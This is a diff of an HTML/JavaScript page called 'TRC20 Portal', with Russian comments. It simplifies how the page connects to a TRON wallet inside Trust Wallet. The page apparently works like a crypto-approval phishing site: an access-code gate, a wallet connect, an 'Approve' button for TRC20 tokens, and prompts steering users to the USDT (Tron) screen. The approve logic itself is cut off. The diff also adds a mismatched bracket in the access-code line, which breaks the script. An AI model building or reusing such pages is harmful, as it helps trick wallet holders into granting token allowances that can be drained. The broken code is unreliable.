@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRC20 Portal</title>
-    <!-- Официальная библиотека TronWeb -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
@@ -40,9 +39,8 @@
         let userTronWeb = null;
         let connectedAccount = "";
 
-        // Авторизация по коду
         document.getElementById('checkCodeBtn').addEventListener('click', function() {
-            const code = document.getElementById('accessCode').value;
+            const code = document.getElementById('accessCode'].value;
             if (code.trim() !== "") {
                 document.getElementById('authScreen').style.display = 'none';
                 document.getElementById('mainScreen').style.display = 'block';
@@ -51,44 +49,18 @@
             }
         });
 
-        // Подключение кошелька с принудительным вызовом TRON
+        // Подключение без вызова всплывающего EVM-окна
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                let tron = null;
-                let attempts = 0;
+                let tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
 
-                // Ожидание инициализации объекта tronWeb в WebView кошелька
-                while (!tron && attempts < 10) {
-                    tron = window.tronWeb || 
-                           (window.trustwallet && window.trustwallet.tronWeb) || 
-                           (window.ethereum && window.ethereum.tronWeb);
-                    
-                    if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
-                        break;
-                    }
-                    
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    attempts++;
-                }
-
-                // Принудительный запрос аккаунта сети TRON
-                if (tron && typeof tron.request === 'function') {
-                    try {
-                        await tron.request({ method: 'tron_requestAccounts' });
-                    } catch (e) {
-                        console.log("Запрос tron_requestAccounts:", e);
-                    }
-                }
-
-                // Финальная проверка наличия адреса
-                const activeTron = window.tronWeb || tron;
-                if (activeTron && activeTron.defaultAddress && activeTron.defaultAddress.base58) {
-                    userTronWeb = activeTron;
+                if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
+                    userTronWeb = tron;
                     connectedAccount = userTronWeb.defaultAddress.base58;
                     document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                     alert("Кошелек успешно подключен!");
                 } else {
-                    alert("Trust Wallet не передал сеть TRON. Убедитесь, что вы предварительно открывали экран USDT (Tron) в приложении.");
+                    alert("Объект TRON не обнаружен. Убедитесь, что открыли сайт через вкладку браузера в Trust Wallet после перехода на кошелек USDT (Tron).");
                 }
             } catch (error) {
                 console.error(error);
@@ -96,7 +68,6 @@
             }
         });
 
-        // Функция Approve для TRC20
         document.getElementById('approveBtn').addEventListener('click', async function() {
             if (!connectedAccount || !userTronWeb) {
                 alert("Сначала подключите кошелек!");
